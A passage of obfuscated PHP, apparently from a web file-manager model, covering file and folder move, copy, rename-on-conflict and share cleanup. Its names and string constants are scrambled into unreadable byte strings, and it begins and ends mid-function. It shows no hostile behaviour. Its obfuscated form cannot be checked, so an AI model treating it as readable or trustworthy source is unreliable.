($ìÁ—ÌœŞ == 0) { return $²¤ªÈş¤; } $ûĞ‚é„É = $this->sourceInfo($²¤ªÈş¤); foreach ($óŒ †¦– as $İ™¿Ü†ë) { $‹î£ = $this->_makeItemData($İ™¿Ü†ë, $ûĞ‚é„É, $İ™¿Ü†ë[$¬•â½İ¿[32]]); $‹î£[$¬•â½İ¿[521]] = $İ™¿Ü†ë[$¬•â½İ¿[521]]; $«‰Í±˜™[] = $‹î£; } $this->chunkEventSet($¬•â½İ¿[576], array($¬•â½İ¿[577], $œœÄñúè, $ìÁ—ÌœŞ)); $this->addAll($«‰Í±˜™, array(), !1); $—Æ¬ÀÆ— = $this->where(array($¬•â½İ¿[432] => $²¤ªÈş¤))->select(); $Ğ±‚şå = $this->_childrenMakeRelation($óŒ †¦–, $—Æ¬ÀÆ—); $Ğ±‚şå[$è•ú¸¸¿] = $²¤ªÈş¤; $Ã½Ÿ¤à = array(); $öğŞİ­¹ = array(); foreach ($—Æ¬ÀÆ— as $İ™¿Ü†ë) { $±’ùÆÅ = $İ™¿Ü†ë[$¬•â½İ¿[402]]; $—å÷½Ô² = $this->_childrenMatch($Ğ±‚şå, $İ™¿Ü†ë, $ûĞ‚é„É); $Ã½Ÿ¤à[] = array($¬•â½İ¿[402], $±’ùÆÅ, $¬•â½İ¿[432], $—å÷½Ô²[$¬•â½İ¿[432]]); $öğŞİ­¹[] = array($¬•â½İ¿[402], $±’ùÆÅ, $¬•â½İ¿[521], $—å÷½Ô²[$¬•â½İ¿[521]]); $this->_copyApplyMeta($İ™¿Ü†ë, $ì‘¹—§ß); if ($İ™¿Ü†ë[$¬•â½İ¿[410]] != $¬•â½İ¿[88]) { $ì‘¹—§ß[$¬•â½İ¿[566]][] = $İ™¿Ü†ë[$¬•â½İ¿[468]]; } } $this->chunkEventSet($¬•â½İ¿[578], array($¬•â½İ¿[579], $œœÄñúè, $ìÁ—ÌœŞ)); $this->saveAll($Ã½Ÿ¤à); $this->chunkEventSet($¬•â½İ¿[580], array($¬•â½İ¿[581], $œœÄñúè, $ìÁ—ÌœŞ)); $this->saveAll($öğŞİ­¹); return $²¤ªÈş¤; } private function _childrenMakeRelation($İŞä¦‡Ô, $ç–òÏªê) { $‰£Ù–Ä¨ =& $_SERVER[ä¿÷‹µ±]; $•ÉÓŒÀÑ = array(); $„ä€ì˜Ş = array(); foreach ($İŞä¦‡Ô as $‰´Ñ¹¾Ñ) { $™Ïì³ò˜ = $‰´Ñ¹¾Ñ[$‰£Ù–Ä¨[32]] . $‰£Ù–Ä¨[8] . $‰´Ñ¹¾Ñ[$‰£Ù–Ä¨[521]]; $•ÉÓŒÀÑ[$™Ïì³ò˜] = $‰´Ñ¹¾Ñ[$‰£Ù–Ä¨[402]]; } foreach ($ç–òÏªê as $‰´Ñ¹¾Ñ) { $™Ïì³ò˜ = $‰´Ñ¹¾Ñ[$‰£Ù–Ä¨[32]] . $‰£Ù–Ä¨[8] . $‰´Ñ¹¾Ñ[$‰£Ù–Ä¨[521]]; $ÛŒ”“€ã = $•ÉÓŒÀÑ[$™Ïì³ò˜]; $„ä€ì˜Ş[$ÛŒ”“€ã] = $‰´Ñ¹¾Ñ[$‰£Ù–Ä¨[402]]; } return $„ä€ì˜Ş; } private function _childrenMatch($á¾ ©ü, $˜‰”¾ø, $Š÷µæ–É) { $¤Áâµ˜ =& $_SERVER[ä¿÷‹µ±]; $İä«´µş = $Š÷µæ–É[$¤Áâµ˜[521]]; $Öëº†ûĞ = $this->parentLevelArray($˜‰”¾ø[$¤Áâµ˜[521]]); foreach ($Öëº†ûĞ as $˜öÔÛİ‘) { if (isset($á¾ ©ü[$˜öÔÛİ‘])) { $İä«´µş .= $á¾ ©ü[$˜öÔÛİ‘] . $¤Áâµ˜[582]; } } $İä«´µş = rtrim($İä«´µş, $¤Áâµ˜[50]) . $¤Áâµ˜[50]; $©°è´š = $this->parentLevelArray($İä«´µş); $‹µ·„İó = $©°è´š[count($©°è´š) - 1]; return array($¤Áâµ˜[432] => $‹µ·„İó, $¤Áâµ˜[521] => $İä«´µş); } private function _makeItemData($¸·ˆ»ä¤, $ïâşÓÉ, $Ö—“ÃÈ¦) { $¡ûâö–¦ =& $_SERVER[ä¿÷‹µ±]; $˜Œ°‘ı¥ = array($¡ûâö–¦[583] => $¸·ˆ»ä¤[$¡ûâö–¦[410]], $¡ûâö–¦[420] => $Ö—“ÃÈ¦, $¡ûâö–¦[584] => $¸·ˆ»ä¤[$¡ûâö–¦[412]] ? $¸·ˆ»ä¤[$¡ûâö–¦[412]] : $¡ûâö–¦[12], $¡ûâö–¦[469] => $¸·ˆ»ä¤[$¡ûâö–¦[468]] ? $¸·ˆ»ä¤[$¡ûâö–¦[468]] : 0, $¡ûâö–¦[585] => $¸·ˆ»ä¤[$¡ûâö–¦[76]] ? $¸·ˆ»ä¤[$¡ûâö–¦[76]] : 0, $¡ûâö–¦[586] => intval($ïâşÓÉ[$¡ûâö–¦[411]]), $¡ûâö–¦[587] => intval($ïâşÓÉ[$¡ûâö–¦[505]]), $¡ûâö–¦[588] => intval(USER_ID), $¡ûâö–¦[589] => intval(USER_ID), $¡ûâö–¦[401] => intval($ïâşÓÉ[$¡ûâö–¦[402]]), $¡ûâö–¦[590] => $ïâşÓÉ[$¡ûâö–¦[521]] . $ïâşÓÉ[$¡ûâö–¦[402]] . $¡ûâö–¦[50], $¡ûâö–¦[424] => $¸·ˆ»ä¤[$¡ûâö–¦[85]] ? $¸·ˆ»ä¤[$¡ûâö–¦[85]] : time(), $¡ûâö–¦[430] => 0, $¡ûâö–¦[591] => $¡ûâö–¦[12]); return $˜Œ°‘ı¥; } private function _copyApplyMeta($Õ‘ Ø‚ó, &$“­İÚõØ) { $øö¦ªŞğ =& $_SERVER[ä¿÷‹µ±]; $àı¡Ú¤ß = $Õ‘ Ø‚ó[$øö¦ªŞğ[402]]; $÷İÃ£†Ä = $Õ‘ Ø‚ó[$øö¦ªŞğ[32]]; if (!isset($Õ‘ Ø‚ó[$øö¦ªŞğ[592]]) || !$Õ‘ Ø‚ó[$øö¦ªŞğ[592]] || $Õ‘ Ø‚ó[$øö¦ªŞğ[592]] == $øö¦ªŞğ[197]) { $“­İÚõØ[$øö¦ªŞğ[568]][] = array($øö¦ªŞğ[402], $àı¡Ú¤ß, $øö¦ªŞğ[592], short_id($àı¡Ú¤ß)); } if (Input::check($÷İÃ£†Ä, $øö¦ªŞğ[593])) { $“­İÚõØ[$øö¦ªŞğ[567]][] = array($øö¦ªŞğ[402] => $àı¡Ú¤ß, $øö¦ªŞğ[94] => $øö¦ªŞğ[465], $øö¦ªŞğ[374] => str_replace($øö¦ªŞğ[53], $øö¦ªŞğ[12], Pinyin::get($÷İÃ£†Ä))); $“­İÚõØ[$øö¦ªŞğ[567]][] = array($øö¦ªŞğ[402] => $àı¡Ú¤ß, $øö¦ªŞğ[94] => $øö¦ªŞğ[464], $øö¦ªŞğ[374] => Pinyin::get($÷İÃ£†Ä, $øö¦ªŞğ[594])); } $“­İÚõØ[$øö¦ªŞğ[567]][] = array($øö¦ªŞğ[402] => $àı¡Ú¤ß, $øö¦ªŞğ[94] => $øö¦ªŞğ[444], $øö¦ªŞğ[374] => KodSort::makeStr($÷İÃ£†Ä)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($‡¨«á„) { $¨ÖØéâá =& $_SERVER[ä¿÷‹µ±]; $±îóû¦¥ = $this->sourceInfo($‡¨«á„); $‚Óáƒ­ª = $¨ÖØéâá[595]; $°˜·°œ÷ = array($¨ÖØéâá[521] => array($¨ÖØéâá[550], $±îóû¦¥[$¨ÖØéâá[521]] . $‡¨«á„ . $¨ÖØéâá[551]), $¨ÖØéâá[431] => $this->targetIsDelete); $è÷¯“ö = $this->field($‚Óáƒ­ª)->where($°˜·°œ÷)->select(); if (!$è÷¯“ö) { return; } $è÷¯“ö = array_to_keyvalue($è÷¯“ö, $¨ÖØéâá[402]); foreach ($è÷¯“ö as $í²Å¤«‘) { $¹ÕÙğ¬ª = $í²Å¤«‘[$¨ÖØéâá[432]]; $‡¨«á„ = $í²Å¤«‘[$¨ÖØéâá[402]]; if (!isset($this->_childrenListCache[$‡¨«á„]) && $í²Å¤«‘[$¨ÖØéâá[410]] == $¨ÖØéâá[88]) { $this->_childrenListCache[$‡¨«á„] = array(); } if (!isset($this->_childrenListCache[$¹ÕÙğ¬ª])) { $this->_childrenListCache[$¹ÕÙğ¬ª] = array(); } $this->_childrenListCache[$¹ÕÙğ¬ª][$‡¨«á„] = $í²Å¤«‘; $this->_childrenItemCache[$‡¨«á„] = $í²Å¤«‘; } } private function _childrenListAll($¼àÄÅŞë, &$¨›ù¶) { $­ô¨Ú‚® =& $_SERVER[ä¿÷‹µ±]; if (!isset($this->_childrenListCache[$¼àÄÅŞë])) { return; } $ÃÙÔŞÎÔ = $this->_childrenListCache[$¼àÄÅŞë]; foreach ($ÃÙÔŞÎÔ as $«Ï”çª => $¯óêëşá) { $¨›ù¶[$«Ï”çª] = $¯óêëşá; if ($¯óêëşá[$­ô¨Ú‚®[410]] == $­ô¨Ú‚®[88]) { $this->_childrenListAll($«Ï”çª, $¨›ù¶); } } } private function sourceInfoCache($Ò‰ÎÏ·ş) { if (isset($this->_childrenItemCache[$Ò‰ÎÏ·ş])) { return $this->_childrenItemCache[$Ò‰ÎÏ·ş]; } return $this->sourceInfo($Ò‰ÎÏ·ş); } private function _childrenList($ë–Íñïí) { if (isset($this->_childrenListCache[$ë–Íñïí])) { return $this->_childrenListCache[$ë–Íñïí]; } return $this->_childrenListSelect($ë–Íñïí); } private function _childrenListSelect($½¤áÛÚİ) { $¿ì²¦±§ =& $_SERVER[ä¿÷‹µ±]; $¿Æ•²¶â = array($¿ì²¦±§[432] => $½¤áÛÚİ, $¿ì²¦±§[431] => $this->targetIsDelete); $ºû’Šô‡ = $this->where($¿Æ•²¶â)->select(); $ºû’Šô‡ = $ºû’Šô‡ ? $ºû’Šô‡ : array(); $ÕÖèÒÍ = array_to_keyvalue($ºû’Šô‡, $¿ì²¦±§[402]); $this->_childrenListCache[$½¤áÛÚİ] = $ÕÖèÒÍ; foreach ($ÕÖèÒÍ as $½¤áÛÚİ => $Ø¼¿ïô) { $this->_childrenItemCache[$½¤áÛÚİ] = $Ø¼¿ïô; } return $ÕÖèÒÍ; } private function fileNameExistCache($ï··”ÏÉ, $§‡ûòİ¬) { $»ÀóŸß =& $_SERVER[ä¿÷‹µ±]; $§‡ûòİ¬ = strtolower($§‡ûòİ¬); $£ºÄû‡Ú = $this->_childrenList($ï··”ÏÉ); foreach ($£ºÄû‡Ú as $¶Úõ«ÆŒ) { if ($§‡ûòİ¬ == strtolower($¶Úõ«ÆŒ[$»ÀóŸß[32]])) { return $¶Úõ«ÆŒ[$»ÀóŸß[402]]; } } return !1; } private function fileNameAutoCache($¾û™ê§, $’Ù“÷Û®, $åù’±ë», $ÚÕÛàùã) { $Áü¬Å¢ =& $_SERVER[ä¿÷‹µ±]; $è·Íµ«» = $this->_childrenList($¾û™ê§); $ÚùïØ¶Í = array_to_keyvalue($è·Íµ«», $Áü¬Å¢[12], $Áü¬Å¢[32]); return $this->fileNameAutoGet($ÚùïØ¶Í, $’Ù“÷Û®, $åù’±ë», $ÚÕÛàùã); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ûâ½İŒ¶, $åÏ·«’…, $À³èş»Š = REPEAT_REPLACE, $­Şª² = '') { $“æœç…Ä =& $_SERVER[ä¿÷‹µ±]; $—ˆ‰šóº = $this->sourceInfo($Ûâ½İŒ¶); $»ò‚‹Œñ = $this->sourceInfo($åÏ·«’…); if ($—ˆ‰šóº[$“æœç…Ä[432]] == $»ò‚‹Œñ[$“æœç…Ä[402]]) { if ($—ˆ‰šóº[$“æœç…Ä[431]] == $“æœç…Ä[88]) { Model($“æœç…Ä[429])->restore(array($Ûâ½İŒ¶)); } if (!$­Şª² || $­Şª² == $—ˆ‰šóº[$“æœç…Ä[32]]) { return $Ûâ½İŒ¶; } } $’õ–òÆù = $this->pathInfoMore($Ûâ½İŒ¶); if ($this->isParentOf($Ûâ½İŒ¶, $åÏ·«’…)) { return !1; } if (!$—ˆ‰šóº || !$»ò‚‹Œñ || $»ò‚‹Œñ[$“æœç…Ä[410]] != $“æœç…Ä[88]) { return !1; } Hook::trigger($“æœç…Ä[596], $’õ–òÆù); $this->targetIsDelete = intval($—ˆ‰šóº[$“æœç…Ä[431]]); if ($—ˆ‰šóº[$“æœç…Ä[432]] == $åÏ·«’… && $­Şª² != $—ˆ‰šóº[$“æœç…Ä[32]]) { $»–ŒáÜ = $this->fileNameExist($åÏ·«’…, $­Şª²); if ($»–ŒáÜ && $—ˆ‰šóº[$“æœç…Ä[410]] == $“æœç…Ä[197]) { $³àß‹´ú = $this->sourceInfo($»–ŒáÜ); $ÑÏÎ°¿ = $this->fileHistory($³àß‹´ú, $—ˆ‰šóº[$“æœç…Ä[468]], $—ˆ‰šóº[$“æœç…Ä[76]]); if (!$ÑÏÎ°¿) { Model($“æœç…Ä[471])->remove($—ˆ‰šóº[$“æœç…Ä[468]]); } $this->removeNow($Ûâ½İŒ¶, !1); $this->folderSizeReset($åÏ·«’…); Hook::trigger($“æœç…Ä[597], $’õ–òÆù); return $»–ŒáÜ; } } $áÈÄôİä = $­Şª² ? $­Şª² : $—ˆ‰šóº[$“æœç…Ä[32]]; $this->lockMoveStart($Ûâ½İŒ¶); $this->lockWriteStart($åÏ·«’…, $áÈÄôİä); $íø¿¢–é = array($“æœç…Ä[566] => array(), $“æœç…Ä[598] => !1); $this->clearShare($Ûâ½İŒ¶, $åÏ·«’…); $õùª¾·À = $this->fileNameExistCache($åÏ·«’…, $—ˆ‰šóº[$“æœç…Ä[32]]); $ÙÀ…ş†Œ = $this->_move($Ûâ½İŒ¶, $åÏ·«’…, $À³èş»Š, $íø¿¢–é, $­Şª²); $this->sourceCacheClear(); if ($—ˆ‰šóº[$“æœç…Ä[410]] == $“æœç…Ä[88] && $õùª¾·À) { $this->folderSizeResetChildren($ÙÀ…ş†Œ); } Model($“æœç…Ä[199])->linkAdd($íø¿¢–é[$“æœç…Ä[566]]); if ($õùª¾·À && $íø¿¢–é[$“æœç…Ä[598]]) { $this->removeNow($Ûâ½İŒ¶, !1); } $this->lockMoveEnd($Ûâ½İŒ¶); $this->lockWriteEnd($åÏ·«’…, $áÈÄôİä); $this->folderSizeReset($—ˆ‰šóº[$“æœç…Ä[432]]); $this->folderSizeReset($åÏ·«’…); $šºŒâ¥ = array($—ˆ‰šóº[$“æœç…Ä[432]], $åÏ·«’…); if ($—ˆ‰šóº[$“æœç…Ä[410]] == $“æœç…Ä[88]) { $šºŒâ¥[] = $Ûâ½İŒ¶; } $this->updateModifyTime($šºŒâ¥); Model($“æœç…Ä[570])->eventMove($Ûâ½İŒ¶, $—ˆ‰šóº[$“æœç…Ä[432]], $åÏ·«’…); Hook::trigger($“æœç…Ä[597], $’õ–òÆù); return $ÙÀ…ş†Œ; } private function _move($Öûõ¥”«, $»‚ù³Ş³, $Ş±€€¾ô, &$êï¤Ã›¡, $éõšö™Ô = '') { $‚«œÖ©Š =& $_SERVER[ä¿÷‹µ±]; $ÕÖê = $this->sourceInfo($Öûõ¥”«); $¯›ŸõÜ = $ÕÖê[$‚«œÖ©Š[410]] == $‚«œÖ©Š[88]; $şÜ«üÒ“ = $éõšö™Ô ? $éõšö™Ô : $ÕÖê[$‚«œÖ©Š[32]]; $ºæ­µ•ù = $this->fileNameExistCache($»‚ù³Ş³, $şÜ«üÒ“); $this->lockMoveStart($Öûõ¥”«); $this->lockWriteStart($»‚ù³Ş³, $şÜ«üÒ“); if (!$ºæ­µ•ù) { return $this->_moveForce($Öûõ¥”«, $»‚ù³Ş³, $şÜ«üÒ“); } $è˜€İè¯ = $ºæ­µ•ù; $—ÍÎÈœ¤ = !1; if ($¯›ŸõÜ) { if ($Ş±€€¾ô == REPEAT_RENAME_FOLDER) { $şÜ«üÒ“ = $this->fileNameAuto($»‚ù³Ş³, $şÜ«üÒ“, $Ş±€€¾ô, $¯›ŸõÜ); $è˜€İè¯ = $this->_moveForce($Öûõ¥”«, $»‚ù³Ş³, $şÜ«üÒ“); } else { if ($Ş±€€¾ô == REPEAT_RENAME_FOLDER) { $Ş±€€¾ô = REPEAT_RENAME; } $€É‘òÅ´ = $this->_childrenListSelect($Öûõ¥”«); foreach ($€É‘òÅ´ as $”ËŒ“×Û) { $this->_move($”ËŒ“×Û[$‚«œÖ©Š[402]], $ºæ­µ•ù, $Ş±€€¾ô, $êï¤Ã›¡); } $—ÍÎÈœ¤ = !0; } } else { if ($Ş±€€¾ô == REPEAT_SKIP) { $—ÍÎÈœ¤ = !0; } else { if ($Ş±€€¾ô == REPEAT_RENAME || $Ş±€€¾ô == REPEAT_RENAME_FOLDER) { $şÜ«üÒ“ = $this->fileNameAuto($»‚ù³Ş³, $şÜ«üÒ“, $Ş±€€¾ô, $¯›ŸõÜ); $è˜€İè¯ = $this->_moveForce($Öûõ¥”«, $»‚ù³Ş³, $şÜ«üÒ“); } else { if ($Ş±€€¾ô == REPEAT_REPLACE) { $¼ÎûæÎÌ = $this->sourceInfoCache($ºæ­µ•ù); $—Ô²¹‡¬ = $this->fileHistory($¼ÎûæÎÌ, $ÕÖê[$‚«œÖ©Š[468]], $ÕÖê[$‚«œÖ©Š[76]]); $—ÍÎÈœ¤ = !0; if ($—Ô²¹‡¬) { $êï¤Ã›¡[$‚«œÖ©Š[566]][] = $ÕÖê[$‚«œÖ©Š[468]]; } } } } } if ($—ÍÎÈœ¤ && !$êï¤Ã›¡[$‚«œÖ©Š[598]]) { $êï¤Ã›¡[$‚«œÖ©Š[598]] = !0; } return $è˜€İè¯; } private function _moveForce($ˆİÜï¦, $ì’ÈÚÑ, $ßŞ¹êÈî) { $×·‘ñÓµ =& $_SERVER[ä¿÷‹µ±]; $£€ß„¬ = $this->sourceInfo($ˆİÜï¦); $îà´–­è = $this->sourceInfo($ì’ÈÚÑ); $”ŠÒÓ†Õ = $£€ß„¬[$×·‘ñÓµ[410]] == $×·‘ñÓµ[88]; $³±“½Áæ = array($×·‘ñÓµ[401] => $îà´–­è[$×·‘ñÓµ[402]], $×·‘ñÓµ[590] => $îà´–­è[$×·‘ñÓµ[521]] . $îà´–­è[$×·‘ñÓµ[402]] . $×·‘ñÓµ[50], $×·‘ñÓµ[586] => $îà´–­è[$×·‘ñÓµ[411]], $×·‘ñÓµ[587] => $îà´–­è[$×·‘ñÓµ[505]], $×·‘ñÓµ[589] => USER_ID, $×·‘ñÓµ[420] => $ßŞ¹êÈî); $€å»­ß = $£€ß„¬[$×·‘ñÓµ[411]] == SourceModel::TYPE_GROUP && $îà´–­è[$×·‘ñÓµ[411]] == SourceModel::TYPE_GROUP && $£€ß„¬[$×·‘ñÓµ[505]] == $îà´–­è[$×·‘ñÓµ[505]]; if (!$€å»­ß && $this->moveClearAuth) { Model($×·‘ñÓµ[502])->authClear($ˆİÜï¦); } $û ‡ÀûÌ = $£€ß„¬[$×·‘ñÓµ[431]] == $×·‘ñÓµ[88] && $îà´–­è[$×·‘ñÓµ[431]] != $×·‘ñÓµ[88]; if ($û ‡ÀûÌ) { $³±“½Áæ[$×·‘ñÓµ[430]] = 0; } if ($”ŠÒÓ†Õ) { $ı¥…ñ¼” = array($×·‘ñÓµ[590] => array($×·‘ñÓµ[550], $£€ß„¬[$×·‘ñÓµ[521]] . $£€ß„¬[$×·‘ñÓµ[402]] . $×·‘ñÓµ[551])); $¨»õ°øÉ = $£€ß„¬[$×·‘ñÓµ[521]] . $£€ß„¬[$×·‘ñÓµ[402]] . $×·‘ñÓµ[50]; $¤‡Ñ½ = $îà´–­è[$×·‘ñÓµ[521]] . $îà´–­è[$×·‘ñÓµ[402]] . $×·‘ñÓµ[50] . $£€ß„¬[$×·‘ñÓµ[402]] . $×·‘ñÓµ[50]; $½Ÿ‹çÂ = array($×·‘ñÓµ[590] => array($×·‘ñÓµ[599], "\x72\x65\x70\154\141\143\145\50\160\141\162\145\156\x74\114\x65\166\x65\154\54\x27{$¨»õ°øÉ}\x27\x2c\x27{$¤‡Ñ½}\47\51"), $×·‘ñÓµ[586] => $îà´–­è[$×·‘ñÓµ[411]], $×·‘ñÓµ[587] => $îà´–­è[$×·‘ñÓµ[505]]); if ($û ‡ÀûÌ) { $½Ÿ‹çÂ[$×·‘ñÓµ[430]] = 0; } $this->where($ı¥…ñ¼”)->data($½Ÿ‹çÂ)->save(); } $this->where(array($×·‘ñÓµ[417] => $ˆİÜï¦))->data($³±“½Áæ)->save(); return $ˆİÜï¦; } private function clearShare($ÓÒÄáİæ, $µÃ¿ó¹) { $€º¾ËÌÚ =& $_SERVER[ä¿÷‹µ±]; $ê”ÄüË¿ = $this->sourceInfo($ÓÒÄáİæ); $³í”ŞÏ„ = $this->sourceInfo($µÃ¿ó¹); if ($ê”ÄüË¿[$€º¾ËÌÚ[505]] == $³í”ŞÏ„[$€º¾ËÌÚ[505]] && $ê”ÄüË¿[$€º¾ËÌÚ[411]] == $€º¾ËÌÚ[600]) { return; } $«™ğËòÆ = array($€º¾ËÌÚ[521] => array($€º¾ËÌÚ[550], $ê”ÄüË¿[$€º¾ËÌÚ[521]] . $ÓÒÄáİæ . $€º¾ËÌÚ[551])); $¸®×¢›  = $this->field($€º¾ËÌÚ[417])->where($«™ğËòÆ)->getField($€º¾ËÌÚ[402], !0); if (!$¸®×¢› ) { return; } $«™ğËòÆ = array($€º¾ËÌÚ[402] => array($€º¾ËÌÚ[7], $¸®×¢› ), $€º¾ËÌÚ[496] => 1); $ì…Æàøı = Model($€º¾ËÌÚ[601])->field($€º¾ËÌÚ[489])->where($«™ğËòÆ)->select(); if (!$ì…Æàøı) { return; } $ì…Æàøı = array_to_keyvalue($ì…Æàøı, $€º¾ËÌÚ[12], $€º¾ËÌÚ[489]); $«™ğËòÆ = array($€º¾ËÌÚ[489] => array($€º¾ËÌÚ[7], $ì…Æàøı)); Model($€º¾ËÌÚ[601])->where($«™ğËòÆ)->save(array($€º¾ËÌÚ[496] => 0)); Model($€º¾ËÌÚ[602])->where($«™ğËòÆ)->delete(); } public function copyFolderFromIO($’¾İÈ¶ã, $‘¸úÅõÆ, $×öÌø´–, $†î³—Ú², $œï‡¦—œ, $Ç­å£”Ó = false) { $–ëºçÕ‡ =& $_SERVER[ä¿÷‹µ±]; $ÊÔÃ‰õü = array($–ëºçÕ‡[567] => array(), $–ëºçÕ‡[568] => array(), $–ëºçÕ‡[566] => array(), $–ëºçÕ‡[603] => array()); $ŒÕ€î„ = $Ç­å£”Ó ? $Ç­å£”Ó : $’¾İÈ¶ã->pathThis($‘¸úÅõÆ); $‰ÏØÙ¡ = $this->fileNameExist($×öÌø´–, $ŒÕ€î„); $Ô“¬Íİä = $this->mkdir($×öÌø´–, $ŒÕ€î„, $†î³—Ú²); if (!$‰ÏØÙ¡ || $†î³—Ú² == REPEAT_RENAME_FOLDER) { $†î³—Ú² = !1; } if ($‰ÏØÙ¡) { $this->_childrenAllMake($‰ÏØÙ¡); } Hook::trigger($–ëºçÕ‡[604]); $this->_copyChildTo($’¾İÈ¶ã, $‘¸úÅõÆ, $Ô“¬Íİä, $†î³—Ú², $ÊÔÃ‰õü, $œï‡¦—œ); Hook::trigger($–ëºçÕ‡[605]); if ($Ô“¬Íİä) { $this->folderSizeResetChildren($Ô“¬Íİä); } $this->_childrenListClear(); Model($–ëºçÕ‡[569])->addAll($ÊÔÃ‰õü[$–ëºçÕ‡[567]], array(), !0); Model($–ëºçÕ‡[570])->eventCopy($Ô“¬Íİä); $this->saveAll($ÊÔÃ‰õü[$–ëºçÕ‡[568]]); Model($–ëºçÕ‡[471])->linkAdd($ÊÔÃ‰õü[$–ëºçÕ‡[566]]); Model($–ëºçÕ‡[471])->remove($ÊÔÃ‰õü[$–ëºçÕ‡[603]]); $this->folderSizeReset($×öÌø´–); $this->updateModifyTime($×öÌø´–); return $Ô“¬Íİä; } private function _copyChildTo($ÑŠ¦€¯ñ, $šçÙ©—, $ŞÍ”±”, $Û¬â–Ş, &$ÏèË¿Òˆ, $³«Üã²§) { $¼ÅÖ¦ÜŸ =& $_SERVER[ä¿÷‹µ±]; $¯ÓÃ¶İ¥ = $this->sourceInfoCache($ŞÍ”±”); $“¢ô•¸¸ = $ÑŠ¦€¯ñ->listPath($šçÙ©—); $“¢ô•¸¸ = $“¢ô•¸¸ ? $“¢ô•¸¸ : array($¼ÅÖ¦ÜŸ[83] => array(), $¼ÅÖ¦ÜŸ[82] => array()); $‰•¶Î×² = array_merge($“¢ô•¸¸[$¼ÅÖ¦ÜŸ[83]], $“¢ô•¸¸[$¼ÅÖ¦ÜŸ[82]]); $÷Ëš¸à = $this->_addFiles($ÑŠ¦€¯ñ, $“¢ô•¸¸[$¼ÅÖ¦ÜŸ[83]], $³«Üã²§); $º¼“½öø = array(); foreach ($‰•¶Î×² as &$¸œÆçù³) { if (isset($÷Ëš¸à[$¸œÆçù³[$¼ÅÖ¦ÜŸ[32]]])) { $¸œÆçù³ = $÷Ëš¸à[$¸œÆçù³[$¼ÅÖ¦ÜŸ[32]]]; } $¸œÆçù³[$¼ÅÖ¦ÜŸ[410]] = $¸œÆçù³[$¼ÅÖ¦ÜŸ[33]] == $¼ÅÖ¦ÜŸ[75]; $¸œÆçù³[$¼ÅÖ¦ÜŸ[412]] = substr(_get($¸œÆçù³, $¼ÅÖ¦ÜŸ[174], $¼ÅÖ¦ÜŸ[12]), 0, 10); $¸œÆçù³[$¼ÅÖ¦ÜŸ[76]] = _get($¸œÆçù³, $¼ÅÖ¦ÜŸ[76], 0); $¸œÆçù³[$¼ÅÖ¦ÜŸ[468]] = _get($¸œÆçù³, $¼ÅÖ¦ÜŸ[468], 0); if (!isset($¸œÆçù³[$¼ÅÖ¦ÜŸ[606]]) && $¸œÆçù³[$¼ÅÖ¦ÜŸ[468]]) { $ÏèË¿Òˆ[$¼ÅÖ¦ÜŸ[603]][] = $¸œÆçù³[$¼ÅÖ¦ÜŸ[468]]; } if ($Û¬â–Ş) { $™ÊïØ‘ï = $this->fileNameExistCache($ŞÍ”±”, $¸œÆçù³[$¼ÅÖ¦ÜŸ[32]]); if ($™ÊïØ‘ï) { if ($¸œÆçù³[$¼ÅÖ¦ÜŸ[410]] || $Û¬â–Ş == REPEAT_SKIP) { continue; } if ($Û¬â–Ş == REPEAT_REPLACE) { $®îÚåØ = $this->sourceInfoCache($™ÊïØ‘ï); $¸ÁááÏ“ = $this->fileHistory($®îÚåØ, $¸œÆçù³[$¼ÅÖ¦ÜŸ[468]], $¸œÆçù³[$¼ÅÖ¦ÜŸ[76]]); if ($¸ÁááÏ“) { $ÏèË¿Òˆ[$¼ÅÖ¦ÜŸ[566]][] = $¸œÆçù³[$¼ÅÖ¦ÜŸ[468]]; } continue; } else { if ($Û¬â–Ş == REPEAT_RENAME) { $¸œÆçù³[$¼ÅÖ¦ÜŸ[32]] = $this->fileNameAutoCache($ŞÍ”±”, $¸œÆçù³[$¼ÅÖ¦ÜŸ[32]], $Û¬â–Ş, !1); } } } } if (!$¸œÆçù³[$¼ÅÖ¦ÜŸ[410]] && $¸œÆçù³[$¼ÅÖ¦ÜŸ[468]] == 0) { continue; } if (!$¸œÆçù³[$¼ÅÖ¦ÜŸ[410]] && $¸œÆçù³[$¼ÅÖ¦ÜŸ[468]]) { $ÏèË¿Òˆ[$¼ÅÖ¦ÜŸ[566]][] = $¸œÆçù³[$¼ÅÖ¦ÜŸ[468]]; } $º¼“½öø[] = $this->_makeItemData($¸œÆçù³, $¯ÓÃ¶İ¥, $¸œÆçù³[$¼ÅÖ¦ÜŸ[32]]); } unset($¸œÆçù³); if (!empty($º¼“½öø)) { $this->addAll($º¼“½öø); $this->_childrenListSelect($ŞÍ”±”); } $Ì†’óµæ = $this->_childrenList($ŞÍ”±”); $Ì†’óµæ = array_to_keyvalue($Ì†’óµæ, $¼ÅÖ¦ÜŸ[32]); foreach ($‰•¶Î×² as $¸œÆçù³) { $®îÚåØ = $Ì†’óµæ[$¸œÆçù³[$¼ÅÖ¦ÜŸ[32]]]; $øÜééğ = $®îÚåØ[$¼ÅÖ¦ÜŸ[402]]; $this->_copyApplyMeta($®îÚåØ, $ÏèË¿Òˆ); if ($¸œÆçù³[$¼ÅÖ¦ÜŸ[33]] == $¼ÅÖ¦ÜŸ[75]) { $¸œÆçù³[$¼ÅÖ¦ÜŸ[84]] = $ÑŠ¦€¯ñ->getPathInner($¸œÆçù³[$¼ÅÖ¦ÜŸ[84]]); $this->_copyChildTo($ÑŠ¦€¯ñ, $¸œÆçù³[$¼ÅÖ¦ÜŸ[84]], $øÜééğ, $Û¬â–Ş, $ÏèË¿Òˆ, $³«Üã²§); } } } private function _addFiles($í†í˜şÄ, $ÆˆÚŠíÜ, $Ìó‹ŞªÉ) { $Ğıèö =& $_SERVER[ä¿÷‹µ±]; if (!$ÆˆÚŠíÜ || count($ÆˆÚŠíÜ) == 0) { return array(); } $ë•ÑáÇó = array(); foreach ($ÆˆÚŠíÜ as &$ˆîŠïÇ) { Hook::trigger($Ğıèö[607], $ˆîŠïÇ); $ˆîŠïÇ[$Ğıèö[84]] = $í†í˜şÄ->getPathInner($ˆîŠïÇ[$Ğıèö[84]]); $ÑÙ²Ğü¢ = $í†í˜şÄ->hashSimple($ˆîŠïÇ[$Ğıèö[84]]); $ÚÁúıı… = $í†í˜şÄ->hashMd5($ˆîŠïÇ[$Ğıèö[84]]); if (strlen($ÚÁúıı…) > 10 && !isset($ë•ÑáÇó[$ÚÁúıı…])) 